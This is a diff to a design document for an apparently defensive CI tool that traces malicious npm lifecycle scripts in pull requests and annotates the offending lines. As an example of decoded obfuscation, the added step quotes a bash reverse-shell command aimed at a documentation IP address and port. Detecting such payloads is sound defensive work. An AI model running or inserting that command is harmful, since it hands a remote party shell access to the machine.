@@ -62,6 +62,11 @@ flowchart LR
    observed behavior and writes the explanation.
 5. **Verdict** = `max(rule severity, model severity)` → check conclusion + PR comment. Branch
    protection turns a failing check into a blocked merge.
+6. **Guilty line**: when a PR is blocked, code walks the flagged process up to the npm
+   lifecycle script that started it and posts an inline review comment on the exact diff line
+   (and, if that script ran a file from the PR, on the line there that spawned the payload).
+   The model only adds a one-sentence "what it does", decoding obfuscation: for the E5
+   reverse shell it decodes the base64 to `bash -i >& /dev/tcp/203.0.113.10/4444 0>&1`.
 
 ## Why it's hard to fool
 
